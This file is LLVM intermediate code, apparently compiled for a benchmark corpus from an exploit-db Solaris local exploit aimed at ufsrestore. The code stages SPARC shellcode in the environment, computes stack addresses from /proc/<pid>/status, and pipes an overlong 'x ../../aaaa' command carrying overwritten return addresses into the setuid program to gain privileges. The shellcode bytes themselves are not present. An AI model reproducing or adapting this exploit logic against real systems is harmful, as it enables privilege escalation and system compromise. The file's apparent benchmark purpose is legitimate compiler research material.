; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20014.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20014.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32, i32 }

@SI_PLATFORM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"sysinfo\00", align 1
@PROG = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"ufsrestore\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"if\00", align 1
@.str.3 = private unnamed_addr constant [17 x i8] c"/var/tmp/dumpufs\00", align 1
@pad2 = common dso_local global i8* null, align 8
@sparc_shellcode = common dso_local global i8* null, align 8
@pad1 = common dso_local global i8* null, align 8
@SHELLCODE_OFFSET = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [16 x i8] c"/proc/%d/status\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [5 x i8] c"read\00", align 1
@stderr = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [14 x i8] c"Pipe failed.\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@STDIN_FILENO = common dso_local global i32 0, align 4
@STDOUT_FILENO = common dso_local global i32 0, align 4
@STDERR_FILENO = common dso_local global i32 0, align 4
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [14 x i8] c"Fork failed.\0A\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.9 = private unnamed_addr constant [25 x i8] c"cd /var/tmp/a*/a*/a*/a*\0A\00", align 1
@.str.10 = private unnamed_addr constant [78 x i8] c"x ../../aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\0A\00", align 1
@FP_OFFSET = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4 x i8*], align 16
  %3 = alloca [5 x i8*], align 16
  %4 = alloca [1024 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [1024 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.TYPE_3__, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i64, align 8
  %19 = alloca [2 x i32], align 4
  %20 = alloca i32*, align 8
  %21 = alloca [256 x i8], align 16
  %22 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  %23 = load i32, i32* @SI_PLATFORM, align 4
  %24 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %25 = call i64 @sysinfo(i32 %23, i8* %24, i32 1024)
  %26 = icmp slt i64 %25, 0
  br i1 %26, label %27, label %30

27:                                               ; preds = %0
  %28 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %29 = call i32 @exit(i32 1) #3
  unreachable

30:                                               ; preds = %0
  %31 = load i32, i32* @PROG, align 4
  %32 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %33 = call i32 @realpath(i32 %31, i8* %32)
  %34 = call i8* @strdup(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %35 = getelementptr inbounds [4 x i8*], [4 x i8*]* %2, i64 0, i64 0
  store i8* %34, i8** %35, align 16
  %36 = call i8* @strdup(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %37 = getelementptr inbounds [4 x i8*], [4 x i8*]* %2, i64 0, i64 1
  store i8* %36, i8** %37, align 8
  %38 = call i8* @strdup(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  %39 = getelementptr inbounds [4 x i8*], [4 x i8*]* %2, i64 0, i64 2
  store i8* %38, i8** %39, align 16
  %40 = getelementptr inbounds [4 x i8*], [4 x i8*]* %2, i64 0, i64 3
  store i8* null, i8** %40, align 8
  %41 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %42 = call i32 @strlen(i8* %41)
  %43 = add nsw i32 %42, 1
  %44 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %45 = call i32 @strlen(i8* %44)
  %46 = add nsw i32 %43, %45
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %10, align 4
  %48 = load i32, i32* %10, align 4
  %49 = add nsw i32 %48, 3
  %50 = and i32 %49, -4
  store i32 %50, i32* %10, align 4
  %51 = load i8*, i8** @pad2, align 8
  %52 = load i32, i32* %10, align 4
  %53 = load i8*, i8** @sparc_shellcode, align 8
  %54 = call i32 @strlen(i8* %53)
  %55 = add nsw i32 %52, %54
  %56 = add nsw i32 %55, 1
  %57 = sub nsw i32 243, %56
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %51, i64 %58
  store i8 0, i8* %59, align 1
  %60 = load i8*, i8** @pad1, align 8
  %61 = call i8* @strdup(i8* %60)
  %62 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 0
  store i8* %61, i8** %62, align 16
  %63 = load i8*, i8** @sparc_shellcode, align 8
  %64 = call i8* @strdup(i8* %63)
  %65 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 1
  store i8* %64, i8** %65, align 8
  %66 = load i8*, i8** @pad2, align 8
  %67 = call i8* @strdup(i8* %66)
  %68 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 2
  store i8* %67, i8** %68, align 16
  %69 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 3
  store i8* null, i8** %69, align 8
  store i32 0, i32* %9, align 4
  store i32 0, i32* %7, align 4
  br label %70

70:                                               ; preds = %76, %30
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [4 x i8*], [4 x i8*]* %2, i64 0, i64 %72
  %74 = load i8*, i8** %73, align 8
  %75 = icmp ne i8* %74, null
  br i1 %75, label %76, label %86

76:                                               ; preds = %70
  %77 = load i32, i32* %7, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %7, align 4
  %79 = sext i32 %77 to i64
  %80 = getelementptr inbounds [4 x i8*], [4 x i8*]* %2, i64 0, i64 %79
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @strlen(i8* %81)
  %83 = add nsw i32 %82, 1
  %84 = load i32, i32* %9, align 4
  %85 = add nsw i32 %84, %83
  store i32 %85, i32* %9, align 4
  br label %70

86:                                               ; preds = %70
  store i32 0, i32* %8, align 4
  store i32 0, i32* %11, align 4
  br label %87

87:                                               ; preds = %93, %86
  %88 = load i32, i32* %8, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 %89
  %91 = load i8*, i8** %90, align 8
  %92 = icmp ne i8* %91, null
  br i1 %92, label %93, label %103

93:                                               ; preds = %87
  %94 = load i32, i32* %8, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %8, align 4
  %96 = sext i32 %94 to i64
  %97 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 %96
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @strlen(i8* %98)
  %100 = add nsw i32 %99, 1
  %101 = load i32, i32* %11, align 4
  %102 = add nsw i32 %101, %100
  store i32 %102, i32* %11, align 4
  br label %87

103:                                              ; preds = %87
  %104 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 0
  %105 = load i8*, i8** %104, align 16
  %106 = load i32, i32* %9, align 4
  %107 = load i32, i32* %7, align 4
  %108 = load i32, i32* %8, align 4
  %109 = add nsw i32 %107, %108
  %110 = add nsw i32 %109, 4
  %111 = mul nsw i32 %110, 4
  %112 = add nsw i32 %106, %111
  %113 = sub nsw i32 255, %112
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %105, i64 %114
  store i8 0, i8* %115, align 1
  %116 = load i32, i32* %9, align 4
  %117 = load i32, i32* %7, align 4
  %118 = load i32, i32* %8, align 4
  %119 = add nsw i32 %117, %118
  %120 = add nsw i32 %119, 3
  %121 = mul nsw i32 %120, 4
  %122 = add nsw i32 %116, %121
  %123 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 0
  %124 = load i8*, i8** %123, align 16
  %125 = call i32 @strlen(i8* %124)
  %126 = add nsw i32 %122, %125
  %127 = add nsw i32 %126, 1
  %128 = load i32, i32* @SHELLCODE_OFFSET, align 4
  %129 = add nsw i32 %127, %128
  store i32 %129, i32* %13, align 4
  %130 = load i32, i32* %11, align 4
  %131 = load i32, i32* %7, align 4
  %132 = load i32, i32* %8, align 4
  %133 = add nsw i32 %131, %132
  %134 = add nsw i32 %133, 4
  %135 = mul nsw i32 %134, 4
  %136 = sub nsw i32 %130, %135
  %137 = add nsw i32 %136, 3
  %138 = and i32 %137, -4
  %139 = add nsw i32 %138, 4
  store i32 %139, i32* %9, align 4
  %140 = load i32, i32* %10, align 4
  %141 = load i32, i32* %9, align 4
  %142 = add nsw i32 %141, %140
  store i32 %142, i32* %9, align 4
  %143 = load i32, i32* %9, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = add nsw i32 %144, %145
  %147 = add nsw i32 %146, 4
  %148 = mul nsw i32 %147, 4
  %149 = add nsw i32 %143, %148
  %150 = call i32 @SA(i32 %149)
  store i32 %150, i32* %14, align 4
  %151 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %152 = call i32 (...) @getpid()
  %153 = call i32 (i8*, i8*, ...) @sprintf(i8* %151, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i32 %152)
  %154 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %155 = load i32, i32* @O_RDONLY, align 4
  %156 = call i32 @open(i8* %154, i32 %155)
  store i32 %156, i32* %12, align 4
  %157 = icmp slt i32 %156, 0
  br i1 %157, label %158, label %162

158:                                              ; preds = %103
  %159 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %160 = call i32 @perror(i8* %159)
  %161 = call i32 @exit(i32 1) #3
  unreachable

162:                                              ; preds = %103
  %163 = load i32, i32* %12, align 4
  %164 = call i64 @read(i32 %163, %struct.TYPE_3__* %15, i32 8)
  %165 = icmp slt i64 %164, 0
  br i1 %165, label %166, label %171

166:                                              ; preds = %162
  %167 = load i32, i32* %12, align 4
  %168 = call i32 @close(i32 %167)
  %169 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  %170 = call i32 @exit(i32 1) #3
  unreachable

171:                                              ; preds = %162
  %172 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %15, i32 0, i32 0
  %173 = load i32, i32* %172, align 4
  %174 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %15, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = add nsw i32 %173, %175
  store i32 %176, i32* %16, align 4
  %177 = load i32, i32* %16, align 4
  %178 = load i32, i32* %14, align 4
  %179 = sub nsw i32 %177, %178
  store i32 %179, i32* %17, align 4
  %180 = load i32, i32* %12, align 4
  %181 = call i32 @close(i32 %180)
  %182 = getelementptr inbounds [2 x i32], [2 x i32]* %19, i64 0, i64 0
  %183 = call i64 @pipe(i32* %182)
  %184 = icmp ne i64 %183, 0
  br i1 %184, label %185, label %189

185:                                              ; preds = %171
  %186 = load i32*, i32** @stderr, align 8
  %187 = call i32 @fprintf(i32* %186, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0))
  %188 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %188, i32* %1, align 4
  br label %265

189:                                              ; preds = %171
  %190 = call i64 (...) @fork()
  store i64 %190, i64* %18, align 8
  %191 = load i64, i64* %18, align 8
  %192 = icmp eq i64 %191, 0
  br i1 %192, label %193, label %213

193:                                              ; preds = %189
  %194 = load i32, i32* @STDIN_FILENO, align 4
  %195 = call i32 @close(i32 %194)
  %196 = getelementptr inbounds [2 x i32], [2 x i32]* %19, i64 0, i64 0
  %197 = load i32, i32* %196, align 4
  %198 = load i32, i32* @STDIN_FILENO, align 4
  %199 = call i32 @dup2(i32 %197, i32 %198)
  %200 = load i32, i32* @STDOUT_FILENO, align 4
  %201 = call i32 @close(i32 %200)
  %202 = getelementptr inbounds [2 x i32], [2 x i32]* %19, i64 0, i64 1
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* @STDOUT_FILENO, align 4
  %205 = call i32 @dup2(i32 %203, i32 %204)
  %206 = load i32, i32* @STDERR_FILENO, align 4
  %207 = call i32 @close(i32 %206)
  %208 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %209 = getelementptr inbounds [4 x i8*], [4 x i8*]* %2, i64 0, i64 0
  %210 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 0
  %211 = call i32 @execve(i8* %208, i8** %209, i8** %210)
  %212 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %212, i32* %1, align 4
  br label %265

213:                                              ; preds = %189
  %214 = load i64, i64* %18, align 8
  %215 = icmp slt i64 %214, 0
  br i1 %215, label %216, label %220

216:                                              ; preds = %213
  %217 = load i32*, i32** @stderr, align 8
  %218 = call i32 @fprintf(i32* %217, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0))
  %219 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %219, i32* %1, align 4
  br label %265

220:                                              ; preds = %213
  %221 = getelementptr inbounds [2 x i32], [2 x i32]* %19, i64 0, i64 1
  %222 = load i32, i32* %221, align 4
  %223 = call i32* @fdopen(i32 %222, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  store i32* %223, i32** %20, align 8
  %224 = load i32*, i32** %20, align 8
  %225 = call i32 @fprintf(i32* %224, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.9, i64 0, i64 0))
  %226 = load i32*, i32** %20, align 8
  %227 = call i32 @fflush(i32* %226)
  %228 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 0
  %229 = call i32 (i8*, i8*, ...) @sprintf(i8* %228, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.10, i64 0, i64 0))
  %230 = load i32, i32* %17, align 4
  %231 = sext i32 %230 to i64
  %232 = load i64, i64* @FP_OFFSET, align 8
  %233 = sub i64 %231, %232
  store i64 %233, i64* %22, align 8
  %234 = load i64, i64* %22, align 8
  %235 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 0
  %236 = call i32 @strlen(i8* %235)
  %237 = sub nsw i32 %236, 33
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 %238
  %240 = bitcast i8* %239 to i64*
  store i64 %234, i64* %240, align 1
  %241 = load i64, i64* %22, align 8
  %242 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 0
  %243 = call i32 @strlen(i8* %242)
  %244 = sub nsw i32 %243, 9
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 %245
  %247 = bitcast i8* %246 to i64*
  store i64 %241, i64* %247, align 1
  %248 = load i32, i32* %17, align 4
  %249 = load i32, i32* %13, align 4
  %250 = add nsw i32 %248, %249
  %251 = sext i32 %250 to i64
  store i64 %251, i64* %22, align 8
  %252 = load i64, i64* %22, align 8
  %253 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 0
  %254 = call i32 @strlen(i8* %253)
  %255 = sub nsw i32 %254, 5
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 %256
  %258 = bitcast i8* %257 to i64*
  store i64 %252, i64* %258, align 1
  %259 = load i32*, i32** %20, align 8
  %260 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 0
  %261 = call i32 @fprintf(i32* %259, i8* %260)
  %262 = load i32*, i32** %20, align 8
  %263 = call i32 @fflush(i32* %262)
  %264 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %264, i32* %1, align 4
  br label %265

265:                                              ; preds = %220, %216, %193, %185
  %266 = load i32, i32* %1, align 4
  ret i32 %266
}

declare dso_local i64 @sysinfo(i32, i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @realpath(i32, i8*) #1

declare dso_local i8* @strdup(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @SA(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i64 @read(i32, %struct.TYPE_3__*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @pipe(i32*) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @execve(i8*, i8**, i8**) #1

declare dso_local i32* @fdopen(i32, i8*) #1

declare dso_local i32 @fflush(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
